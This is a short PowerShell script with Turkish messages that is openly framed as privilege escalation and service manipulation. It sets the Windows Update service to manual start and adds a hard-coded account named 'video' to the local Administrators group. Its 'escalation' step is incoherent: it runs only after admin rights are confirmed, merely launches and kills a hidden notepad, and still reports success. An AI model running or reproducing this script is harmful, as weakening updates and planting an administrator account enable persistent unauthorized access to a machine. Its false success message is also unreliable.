
function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Output "Bu betik yönetici yetkileriyle çalıştırılmalıdır."
    exit
}

function Get-ElevatedCOM {
    return New-Object -ComObject WScript.Shell
}

function Try-Elevate {
    $com = Get-ElevatedCOM
    try {
        $process = Start-Process -FilePath "notepad.exe" -Verb RunAs -PassThru -WindowStyle Hidden
        if ($process) {
            Stop-Process -Id $process.Id -Force
            Write-Output "Ayrıcalık yükseltme denemesi başarılı oldu."
        }
    }
    catch {
        Write-Output "Ayrıcalık yükseltme başarısız: $_"
    }
}

Try-Elevate

function Manipulate-Service {
    try {
        $service = Get-Service -Name "wuauserv" -ErrorAction Stop
        if ($service) {
            Set-Service -Name $service.Name -StartupType Manual
            Write-Output "Hizmet manipülasyonu denendi."
        }
    }
    catch {
        Write-Output "Hizmet manipülasyonu başarısız: $_"
    }
}

Manipulate-Service

function Add-UserToAdmin {
    $username = "video"
    $group = [ADSI]"WinNT://./Administrators,group"
    $user = [ADSI]"WinNT://./$username,user"
    $group.Add($user.Path)
    Write-Output "$username kullanıcısı yöneticiler grubuna eklendi."
}

Add-UserToAdmin

Write-Output "Tüm işlemler tamamlandı."
